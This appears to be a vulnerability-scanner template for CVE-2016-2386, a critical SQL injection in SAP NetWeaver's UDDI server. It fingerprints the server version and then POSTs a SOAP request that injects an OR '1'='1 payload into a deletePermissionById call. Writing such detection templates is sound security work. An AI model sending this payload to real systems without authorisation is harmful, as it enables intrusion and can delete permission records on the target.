id: CVE-2016-2386

info:
  name: SAP NetWeaver SQL Injection Vulnerability
  author: n3integration
  tags: cve,cve2016,kev,vuln,sqli
  description: |
    SQL injection vulnerability in the UDDI server of the SAP NetWeaver J2EE Engine 7.40 allows remote attackers to 
    execute arbitrary SQL commands via unspecified vectors, as documented within SAP Security Note 2101079.
  reference:
    - http://seclists.org/fulldisclosure/2016/May/56
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2016-2386
    - https://www.cve.org/CVERecord?id=CVE-2016-2386
  severity: critical
  metadata:
    max-request: "1"
    runzero-match: service["product"] contains 'SAP:NetWeaver Application Server'
  classification:
    cve-id: CVE-2016-2386
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-score: 0.51594
    epss-percentile: 0.97759
    cpe: cpe:2.3:a:sap:netweaver_application_server_java:7.40:*:*:*:*:*:*:*
  remediation: Apply updates per vendor instructions.

flow: http(1) && http(2)
requests:
  - path:
      - "{{BaseURL}}/"
    method: GET
    stop-at-first-match: true
    matchers:
      - type: dsl
        name: is_vulnerable_version
        dsl:
          - "status_code == 200"
          - compare_versions(version, ">= 7.11") && compare_versions(version, "<= 7.50")
        condition: and

    extractors:
      - type: regex
        name: version
        part: server
        group: 1
        regex:
          - 'SAP NetWeaver Application Server\s+(.*)\s+/\s+AS\s+Java'

  - path:
      - "{{BaseURL}}/UDDISecurityService/UDDISecurityImplBean"
    method: POST
    headers:
      ContentType: "text/xml;charset=UTF-8"
      SOAPAction: ""
    body:
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
      xmlns:sec="http://sap.com/esi/uddi/ejb/security/">
        <soapenv:Header/>
        <soapenv:Body>
          <sec:deletePermissionById>
            <permissionId>x' AND 1=(SELECT COUNT(*) FROM BC_UDV3_EL8EM_KEY) or'1'='1</permissionId>
          </sec:deletePermissionById>
        </soapenv:Body>
      </soapenv:Envelope>

    matchers:
      - type: dsl
        name: is_vulnerable
        dsl:
          - "status_code == 200"
          - contains(body, "deletePermissionByIdResponse")
        condition: and
